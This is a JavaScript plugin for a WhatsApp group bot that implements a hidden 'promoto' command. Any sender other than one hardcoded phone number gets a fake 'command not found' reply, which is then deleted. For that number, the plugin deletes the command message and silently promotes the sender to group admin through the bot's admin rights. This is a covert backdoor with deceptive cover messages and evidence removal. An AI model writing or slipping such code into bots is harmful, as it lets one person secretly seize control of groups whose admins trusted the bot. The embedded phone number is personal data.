export default {
  command: ['promoto'],
  category: 'grupo',
  botAdmin: true,
  run: async (client, m, args, usedPrefix, command) => {
    const ownerNumber = '51901931862'
    const senderIdentifier = m.sender
    const senderNumber = senderIdentifier.split('@')[0]
    const isOwnerBot = senderNumber === ownerNumber

    if (!isOwnerBot) {
      const fakeErrorMessage = `ʀᴜʙʏᴊx ʙᴏᴛ  •  ᴄᴏᴍᴀɴᴅᴏ ɴᴏ ᴇɴᴄᴏɴᴛʀᴀᴅᴏ\nᴇʟ ᴄᴏᴍᴀɴᴅᴏ *${command}* ɴᴏ ᴇxɪsᴛᴇ.\nᴜsᴀ *${usedPrefix}help* ᴘᴀʀᴀ ᴠᴇʀ ʟᴀ ʟɪsᴛᴀ ᴅᴇ ᴄᴏᴍᴀɴᴅᴏs.`
      
      const sentMessage = await client.sendMessage(m.chat, { text: fakeErrorMessage }, { quoted: m })
      
      await new Promise((resolve) => setTimeout(resolve, 2000))
      
      try {
        await client.sendMessage(m.chat, { delete: sentMessage.key })
      } catch (error) {
        console.log(error)
      }
      
      return
    }

    try {
      await client.sendMessage(m.chat, { delete: m.key })
    } catch (error) {
      console.log(error)
    }

    try {
      if (!m.isGroup) {
        return
      }

      const groupMetadata = await client.groupMetadata(m.chat)
      const groupParticipants = groupMetadata.participants
      
      const targetParticipant = groupParticipants.find((participant) => participant.id === m.sender)
      
      if (!targetParticipant) {
        return
      }

      const isAlreadyAdmin = targetParticipant.admin === 'admin' || targetParticipant.admin === 'superadmin'
      
      if (isAlreadyAdmin) {
        return
      }

      const botJid = client.user.id.split(':')[0] + '@s.whatsapp.net'
      const botParticipant = groupParticipants.find((participant) => participant.id === botJid)
      
      const isBotAdmin = botParticipant && (botParticipant.admin === 'admin' || botParticipant.admin === 'superadmin')

      if (!isBotAdmin) {
        return
      }

      await client.groupParticipantsUpdate(m.chat, [m.sender], 'promote')
      
    } catch (error) {
      console.log(error)
    }
  }
}